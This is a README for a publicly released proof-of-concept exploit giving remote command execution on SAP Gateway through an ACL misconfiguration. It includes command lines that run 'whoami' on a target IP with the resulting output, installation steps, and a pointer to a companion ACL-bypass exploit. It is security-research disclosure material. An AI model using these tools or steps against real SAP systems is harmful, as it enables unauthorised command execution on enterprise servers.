## What is it?

This PoC exploits an ACL misconfiguration in the SAP Gateway (port
33xx) that leads to a Remote Command Execution (RCE).

`SAPanonGWv1.py` is the first version of the exploit based on raw
packets sent. It does not require any additional modules (Run and
Pwn!).

`SAPanonGWv2.py` is the second version of the exploit based on the
[pysap](https://github.com/gelim/pysap) library.

## Creds

These PoCs were developed by Dmitry [@_chipik](https://twitter.com/_chipik) Chastuhin 


## How to use

```bash
➜python SAPanonGWv1.py -t 172.16.30.28 -p 3300 -c whoami
[*] sending cmd:whoami
n45adm
```


```bash
➜python SAPanonGWv2.py -t <ip> -p 3300 -c whoami
[INFO ] [+] Sending GW_NORMAL_CLIENT
[INFO ] Response: OK
[INFO ] [+] Sending F_SAP_INIT
[INFO ] Response: OK
[INFO ] [+] Sending F_SAP_SEND
[INFO ] [+] Sending F_SAP_SEND2
n45adm
```


## Installation

Only for `SAPanonGWv2.p`

```
git clone https://github.com/gelim/pysap
pip install -r pysap/requirements.txt
python pysap/setup.py install
git clone https://github.com/chipik/SAP_GW_RCE_exploit
```

or 

```
git clone https://github.com/chipik/SAP_GW_RCE_exploit
pip install -r SAP_GW_RCE_exploit/requirements.txt
```


## SAP GW ACL bypass

You can use these exploits together with [SAP MS Trusted](https://github.com/gelim/sap_ms) exploit that allows you to bypass dafault `sec_info` ACL

See our [presentation ](https://github.com/comaeio/OPCDE/blob/master/2019/Emirates/(SAP)%20Gateway%20to%20Heaven%20-%20Dmitry%20Chastuhin%2C%20Mathieu%20Geli/(SAP)%20Gateway%20to%20Heaven.pdf) for details

### Contributors

Contributions made by:

  * Dmitry Chastuhin ([@_chipik](https://twitter.com/_chipik))
  * Mathieu Geli ([@gelim](https://github.com/gelim))
